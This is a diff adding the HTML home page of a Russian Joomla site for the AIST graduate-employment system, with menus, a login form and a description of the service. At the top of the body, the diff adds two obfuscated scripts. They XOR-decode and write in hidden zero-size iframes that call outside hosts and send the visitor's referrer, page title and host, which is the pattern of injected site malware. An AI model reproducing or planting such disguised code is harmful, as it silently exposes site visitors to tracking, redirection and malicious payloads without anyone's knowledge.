@@ -1,0 +1,241 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru-ru" lang="ru-ru" dir="ltr" >
+	<head>
+		  <base href="http://trud.mtrep.org/index.php" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="generator" content="Joomla! - Open Source Content Management" />
+  <title>Система содействия трудоустройства выпускников</title>
+  <link href="/templates/beez5/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+  <link rel="stylesheet" href="http://trud.mtrep.org/components/com_aist/css/aist.css" type="text/css" />
+  <script src="/media/system/js/mootools-core.js" type="text/javascript"></script>
+  <script src="/media/system/js/core.js" type="text/javascript"></script>
+  <script src="/media/system/js/mootools-more.js" type="text/javascript"></script>
+  <script src="/templates/beez5/javascript/md_stylechanger.js" type="text/javascript" defer="defer"></script>
+  <script type="text/javascript">
+function keepAlive() {	var myAjax = new Request({method: "get", url: "index.php"}).send();} window.addEvent("domready", function(){ keepAlive.periodical(3600000); });
+  </script>
+
+		<link rel="stylesheet" href="/templates/system/css/system.css" type="text/css" />
+		<link rel="stylesheet" href="/templates/beez5/css/position.css" type="text/css" media="screen,projection" />
+		<link rel="stylesheet" href="/templates/beez5/css/layout.css" type="text/css" media="screen,projection" />
+		<link rel="stylesheet" href="/templates/beez5/css/print.css" type="text/css" media="Print" />
+		<link rel="stylesheet" href="/templates/beez5/css/beez5.css" type="text/css" />
+		<link rel="stylesheet" href="/templates/beez5/css/general.css" type="text/css" />
+				<!--[if lte IE 6]>
+			<link href="/templates/beez5/css/ieonly.css" rel="stylesheet" type="text/css" />
+		<![endif]-->
+		<!--[if IE 7]>
+			<link href="/templates/beez5/css/ie7only.css" rel="stylesheet" type="text/css" />
+		<![endif]-->
+		<script type="text/javascript" src="/templates/beez5/javascript/hide.js"></script>
+
+		<script type="text/javascript">
+			var big ='72%';
+			var small='53%';
+			var altopen='открыт';
+			var altclose='закрыто';
+			var bildauf='/templates/beez5/images/plus.png';
+			var bildzu='/templates/beez5/images/minus.png';
+			var rightopen='Показать информацию';
+			var rightclose='Скрыть информацию';
+			var fontSizeTitle='Размер шрифта';
+            var bigger='Больше';
+            var reset='Сброс';
+            var smaller='Меньше';
+            var biggerTitle='Увеличение размера';
+            var resetTitle='Вернуть стили по умолчанию';
+            var smallerTitle='Уменьшить размер';
+		</script>
+
+	</head>
+
+	<body>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+
+<div id="all">
+	<div id="back">
+			<div id="header">
+							<div class="logoheader">
+					<h1 id="logo">
+
+										<img src="/images/sampledata/fruitshop/fruits.gif" alt="Joomla!" />
+										<span class="header1">
+					Open Source Content Management					</span></h1>
+				</div><!-- end logoheader -->
+
+					<ul class="skiplinks">
+						<li><a href="#main" class="u2">Пропустить и перейти к материалам</a></li>
+						<li><a href="#nav" class="u2">Перейти к Главной навигации и Войти</a></li>
+											</ul>
+					<h2 class="unseen">Nav view search</h2>
+					<h3 class="unseen">Навигация</h3>
+					
+					<div id="line">
+					<div id="fontsize"></div>
+					<h3 class="unseen">Искать</h3>
+					
+					</div> <!-- end line -->
+		<div id="header-image">
+			
+							<img src="/templates/beez5/images/fruits.jpg"  alt="Логотип" />
+					</div>
+					</div><!-- end header -->
+				<div id="contentarea">
+					<div id="breadcrumbs">
+
+							
+<div class="breadcrumbs">
+<span class="showHere">Вы здесь: </span><span>Home</span></div>
+
+
+					</div>
+
+					
+													<div class="left1 leftbigger" id="nav">
+						
+								<div class="moduletable_menu">
+ <h3><span
+	class="backh"><span class="backh2"><span class="backh3">Главное меню</span></span></span></h3>
+ 
+<ul class="menu">
+<li class="item-101 current"><a href="/" >Главная</a></li></ul>
+</div>
+<div class="moduletable">
+ <h3><span
+	class="backh"><span class="backh2"><span class="backh3">Трудоустройство</span></span></span></h3>
+ 
+<ul class="menu">
+<li class="item-112"><a href="/aist_registration" >Регистрация</a></li><li class="item-113"><a href="/aist_useroffice" >Персональный кабинет</a></li><li class="item-114"><a href="/aist_vacancysearch" >Поиск вакансий</a></li><li class="item-115"><a href="/aist_trainingssearch" >Поиск стажировок для студентов</a></li><li class="item-116"><a href="/aist_resumesearch" >Поиск резюме</a></li><li class="item-117"><a href="/aist_employers" >Работодатели</a></li><li class="item-118"><a href="/aist_personalmessages" >Персональные сообщения</a></li><li class="item-119"><a href="/aist_aisthelp" >Быстрый поиск вакансий</a></li></ul>
+</div>
+<div class="moduletable">
+ <h3><span
+	class="backh"><span class="backh2"><span class="backh3">Форма входа</span></span></span></h3>
+ <form action="/component/aist/" method="post" id="login-form" >
+		<fieldset class="userdata">
+	<p id="form-login-username">
+		<label for="modlgn-username">Логин</label>
+		<input id="modlgn-username" type="text" name="username" class="inputbox"  size="18" />
+	</p>
+	<p id="form-login-password">
+		<label for="modlgn-passwd">Пароль</label>
+		<input id="modlgn-passwd" type="password" name="password" class="inputbox" size="18"  />
+	</p>
+		<p id="form-login-remember">
+		<label for="modlgn-remember">Запомнить меня</label>
+		<input id="modlgn-remember" type="checkbox" name="remember" class="inputbox" value="yes"/>
+	</p>
+		<input type="submit" name="Submit" class="button" value="Войти" />
+	<input type="hidden" name="option" value="com_users" />
+	<input type="hidden" name="task" value="user.login" />
+	<input type="hidden" name="return" value="aW5kZXgucGhwP29wdGlvbj1jb21fYWlzdCZhbXA7dmlldz11c2Vyb2ZmaWNlJmFtcDt0YXNrPXVzZXJvZmZpY2VfZGF0YSZhbXA7Zm9ybV9zaG93dW5pdD0xJkl0ZW1pZD0w" />
+	<input type="hidden" name="fa51b9c4eea61d54cb95086495b0c918" value="1" />	</fieldset>
+	<ul>
+		<li>
+			<a href="/component/users/?view=reset">
+			Забыли пароль?</a>
+		</li>
+		<li>
+			<a href="/component/users/?view=remind">
+			Забыли логин?</a>
+		</li>
+				<li>
+			<a href="/component/users/?view=registration">
+				Регистрация</a>
+		</li>
+			</ul>
+	</form>
+</div>
+
+								
+								<div id="area-3" class="tabouter"><ul class="tabs"><li class="tab"><a href="#" id="link_88" class="linkopen" onclick="tabshow('module_88');return false">Счетчик</a></li></ul><div tabindex="-1" class="tabcontent tabopen" id="module_88">
+
+<div class="custom"  >
+	<a href="http://kcst.bmstu.ru/" target="_blank"><img src="http://kcst.bmstu.ru/counter.php" /></a></div>
+</div></div>
+
+													</div><!-- end navi -->
+						
+					
+					<div id="wrapper2" >
+
+						<div id="main">
+
+						
+							
+<div id="system-message-container">
+</div>
+							<noscript>
+<div id='wait_fon' class='loading_message'>
+<center>
+<div id='wait' class='loading'>
+<table><tr><td><img src="http://trud.mtrep.org/components/com_aist/images/icons/app/stop.png"/>&nbsp;&nbsp;&nbsp;&nbsp;</td><td>JavaScript не поддерживается Вашим браузером или отключен. Для работы системы необходимо включить JavaScript.</td></tr></table></div>
+</center>
+</div>
+</noscript>
+
+
+<div id='csserror'>
+<table><tr><td><img src="http://trud.mtrep.org/components/com_aist/images/icons/app/stop.png"/>&nbsp;&nbsp;&nbsp;&nbsp;</td><td>Файл <b>http://trud.mtrep.org/components/com_aist/css/aist.css</b> не доступен для чтения</td></tr></table></div>
+
+
+<div class="componentheading">АИСТ</div>
+<p>Министерство образования и науки Российской Федерации проводит безвозмездное распространение автоматизированной информационной системы содействия трудоустройству выпускников (далее - АИСТ) во всех образовательных учреждениях профессионального образования Российской Федерации независимо от их форм собственности и ведомственной принадлежности с целью совершенствования механизмов содействия трудоустройству выпускников учреждений профессионального образования и профессиональной ориентации молодежи с учетом спроса на рынке труда.</p>
+<p>Информационная система АИСТ позволит:</p>
+<ul>
+<li><b>работодателям</b> осуществлять поиск соискателей на замещение вакантных должностей среди студентов и выпускников учреждений профессионального образования всех субъектов Российской Федерации;
+<li><b>студентам и выпускникам</b> расширять параметры поиска работы во всех субъектах Российской Федерации соответственно полученным знаниям, устремлениям и карьерным амбициям;
+<li><b>органам исполнительной власти</b>, имеющим в своем ведении образовательные учреждения и осуществляющим управление в сфере образования оперативно принимать управленческие решения по различным направлениям деятельности сферы образования, в том числе связанным с приведением объемов и профилей подготовки квалифицированных кадров в соответствии с потребностями рынка труда субъектов Российской Федерации.
+</ul
+<p>АИСТ выполнена в виде компонента для системы управления контентом CMS Joomla! 1.5. и представляет собой подсистему веб-сайта центра (службы) содействия трудоустройству выпускников или образовательного  учреждения.</p>
+<p>Для работы АИСТ требуются следующие программные компоненты:</p>
+<ul>
+<li>Веб-сервер (рекомендуется использовать Apache);
+<li>Препроцессор гипертекста PHP версии 5 и выше;
+<li>Система управления базами данных MySQL версии 5 и выше.
+</ul>
+<p>Все требуемое программное обеспечение является свободным, доступно для скачивания в сети Интернет и не требует платы за использование.</p><br />
+
+<div class="componentheading">Поиск вакансий по ключевой фразе</div>
+<form action="/component/aist/?view=vacancylist" method="post" id="aist_form_vacancysearch" name="aist_form_vacancysearch" class="aist_form" target="_blank">
+<center>
+<input type="text" name="keywords"></input>
+<input type="submit" value="Искать" style="width:100px;text-align:center;"></input>
+</center>
+</form>
+
+
+						</div><!-- end main -->
+
+					</div><!-- end wrapper -->
+
+				
+			
+					<div class="wrap"></div>
+
+				</div> <!-- end contentarea -->
+
+			</div><!-- back -->
+
+		</div><!-- all -->
+
+		<div id="footer-outer">
+
+		
+			<div id="footer-sub">
+
+							<div id="footer">
+			
+					
+					<p>
+						Работает на <a href="http://www.joomla.org/">Joomla!&#174;</a>
+					</p>
+
+							</div><!-- end footer -->
+			
+			</div>
+
+		</div>
+		
+	</body>
+</html>
